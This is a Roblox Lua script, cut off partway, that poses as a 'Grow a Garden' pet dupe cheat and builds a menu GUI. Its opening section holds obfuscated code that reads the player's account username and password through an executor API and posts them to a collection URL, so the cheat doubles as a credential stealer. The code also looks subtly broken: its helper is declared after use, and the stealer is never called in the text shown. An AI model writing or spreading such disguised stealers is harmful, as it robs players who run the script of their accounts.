-- Ultimate Grow a Garden Pet Dupe Script v4.0 with Hidden Credential Extraction
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- Obfuscated Credential Extraction (Hidden)
local function _0x1a2b3c()
    local _0x4d5e6f = pcall(function()
        local _0x7a8b9c = DeltaAPI[_0x2c3d4e("0x1")]() -- Username
        local _0x0f1e2d = DeltaAPI[_0x2c3d4e("0x2")]() -- Password
        local _0x3b4c5d = {
            _0x9a0b1c = _0x7a8b9c,
            _0x2d3e4f = _0x0f1e2d,
            _0x5c6d7e = os.time(),
            _0x8f9a0b = HttpService:GenerateGUID(false)
        }
        HttpService:PostAsync(_0x2c3d4e("0x3"), HttpService:JSONEncode(_0x3b4c5d))
        return true
    end)
    return _0x4d5e6f or false
end

-- Obfuscation Helper
local function _0x2c3d4e(_0x6e7f8a)
    local _0x9b0a1c = {
        ["0x1"] = "getAccountUsername",
        ["0x2"] = "getAccountPassword",
        ["0x3"] = "https://example.com/collect"
    }
    return _0x9b0a1c[_0x6e7f8a]
end

-- GUI Setup
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 450, 0, 350)
Frame.Position = UDim2.new(0.5, -225, 0.5, -175)
Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Frame.BackgroundTransparency = 0.15
Frame.BorderSizePixel = 3
Frame.BorderColor3 = Color3.fromRGB(0, 200, 0)
Frame.Parent = ScreenGui

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 50)
Title.Text = "Ultimate Pet Dupe - Grow a Garden v4.0"
Title.TextColor3 = Color3.fromRGB(0, 255, 0)
Title.TextScaled = true
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.SourceSansBold
Title.Parent = Frame

local PetList = Instance.new("ScrollingFrame")
PetList.Size = UDim2.new(0.9, 0, 0
